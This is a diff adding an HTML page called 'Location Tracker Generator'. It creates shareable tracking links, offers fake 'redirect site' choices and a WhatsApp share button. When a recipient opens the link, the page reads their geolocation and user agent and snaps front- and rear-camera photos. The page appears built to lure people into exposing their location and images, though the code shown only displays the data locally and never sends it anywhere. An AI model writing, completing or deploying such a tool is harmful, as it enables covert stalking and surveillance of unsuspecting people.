@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Location Tracker">
+  <title>Location Tracker Generator</title>
+  <link rel="manifest" href="manifest.json">
+  <link rel="icon" href="icon.png">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.css" />
+  <style>
+    #map {
+      height: 400px;
+      width: 100%;
+      border-radius: 8px;
+      display: none;
+    }
+  </style>
+</head>
+<body class="bg-gray-100 min-h-screen">
+  <div class="container mx-auto p-4 max-w-4xl">
+    <h1 class="text-3xl font-bold text-center mb-8 text-blue-600">Location Tracker Generator</h1>
+    <div class="bg-white rounded-lg shadow-md p-6 mb-8">
+      <h2 class="text-xl font-semibold mb-4">Generate Tracking Link</h2>
+      <div class="space-y-4">
+        <input type="text" id="trackerName" placeholder="Enter tracker name" class="w-full p-2 border rounded">
+        <select id="socialSelect" class="w-full p-2 border rounded">
+          <option value="">Select Redirect Site</option>
+          <option value="youtube">YouTube</option>
+          <option value="facebook">Facebook</option>
+          <option value="instagram">Instagram</option>
+          <option value="snapchat">Snapchat</option>
+        </select>
+        <button id="generateBtn" class="w-full bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 transition">Generate</button>
+      </div>
+    </div>
+
+    <div id="linkSection" class="bg-white rounded-lg shadow-md p-6 mb-8 hidden">
+      <h2 class="text-xl font-semibold mb-4">Your Tracking Link</h2>
+      <div class="flex items-center gap-2 mb-4">
+        <input id="generatedLink" type="text" readonly class="flex-grow p-2 border rounded bg-gray-50">
+        <button id="copyBtn" class="bg-gray-200 px-4 py-2 rounded hover:bg-gray-300 transition">Copy</button>
+      </div>
+      <a id="whatsappShare" href="#" class="text-green-600 hover:underline text-sm" target="_blank">Share via WhatsApp</a>
+    </div>
+
+    <div id="trackingSection" class="bg-white rounded-lg shadow-md p-6 hidden">
+      <h2 class="text-xl font-semibold mb-4">Tracking Info</h2>
+      <div id="map"></div>
+      <div class="mt-4">
+        <p><strong>Tracker ID:</strong> <span id="trackerId"></span></p>
+        <p><strong>Location:</strong> <span id="location"></span></p>
+        <p><strong>Time:</strong> <span id="time"></span></p>
+        <p><strong>Device:</strong> <span id="device"></span></p>
+        <div class="grid grid-cols-2 gap-4 mt-4">
+          <div>
+            <p class="text-sm font-semibold">Front Camera</p>
+            <img id="frontCam1" class="w-full border rounded">
+            <img id="frontCam2" class="w-full border rounded mt-2">
+          </div>
+          <div>
+            <p class="text-sm font-semibold">Rear Camera</p>
+            <img id="rearCam1" class="w-full border rounded">
+            <img id="rearCam2" class="w-full border rounded mt-2">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      const trackingId = urlParams.get('track');
+
+      if (trackingId) {
+        document.querySelector('h1').textContent = 'Tracking Active';
+        getLocationAndCamera(trackingId);
+      } else {
+        document.getElementById('generateBtn').addEventListener('click', function () {
+          const name = document.getElementById('trackerName').value.trim();
+          const social = document.getElementById('socialSelect').value;
+          if (!name || !social) return alert("Please enter a tracker name and select a site");
+
+          const trackerId = 'track-' + Math.random().toString(36).substring(2, 10);
+          const currentUrl = window.location.href.split('?')[0];
+          const trackingLink = `${currentUrl}?track=${trackerId}`;
+
+          document.getElementById('generatedLink').value = trackingLink;
+          document.getElementById('linkSection').classList.remove('hidden');
+          document.getElementById('whatsappShare').href = `https://wa.me/?text=Check%20this%20out:%20${encodeURIComponent(trackingLink)}`;
+
+          if (social === 'youtube') {
+            const ok = confirm("Do you want to proceed with tracking and image capture?");
+            if (!ok) return;
+          }
+
+          setTimeout(() => {
+            window.location.href = trackingLink;
+          }, 1500);
+        });
+
+        document.getElementById('copyBtn')?.addEventListener('click', function () {
+          const linkInput = document.getElementById('generatedLink');
+          linkInput.select();
+          document.execCommand('copy');
+          alert('Link copied to clipboard!');
+        });
+      }
+    });
+
+    function getLocationAndCamera(trackingId) {
+      if (!navigator.geolocation || !navigator.mediaDevices) {
+        alert("Geolocation or media not supported.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async function (pos) {
+        const lat = pos.coords.latitude.toFixed(4);
+        const lng = pos.coords.longitude.toFixed(4);
+        document.getElementById('trackerId').textContent = trackingId;
+        document.getElementById('location').textContent = `${lat}, ${lng}`;
+        document.getElementById('time').textContent = new Date().toLocaleString();
+        document.getElementById('device').textContent = navigator.userAgent;
+        const map = L.map('map').setView([lat, lng], 14);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        L.marker([lat, lng]).addTo(map).bindPopup("You are here").openPopup();
+        document.getElementById('map').style.display = 'block';
+        await captureCameraImages();
+        document.getElementById('trackingSection').classList.remove('hidden');
+      });
+    }
+
+    async function captureCameraImages() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const track = stream.getVideoTracks()[0];
+        const capture = new ImageCapture(track);
+        document.getElementById('frontCam1').src = URL.createObjectURL(await capture.takePhoto());
+        document.getElementById('frontCam2').src = URL.createObjectURL(await capture.takePhoto());
+        track.stop();
+        const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+        const rearTrack = rearStream.getVideoTracks()[0];
+        const rearCapture = new ImageCapture(rearTrack);
+        document.getElementById('rearCam1').src = URL.createObjectURL(await rearCapture.takePhoto());
+        document.getElementById('rearCam2').src = URL.createObjectURL(await rearCapture.takePhoto());
+        rearTrack.stop();
+      } catch (err) {
+        console.error("Camera error:", err);
+        alert("Camera access denied or failed.");
+      }
+    }
+  </script>
+</body>
+</html>
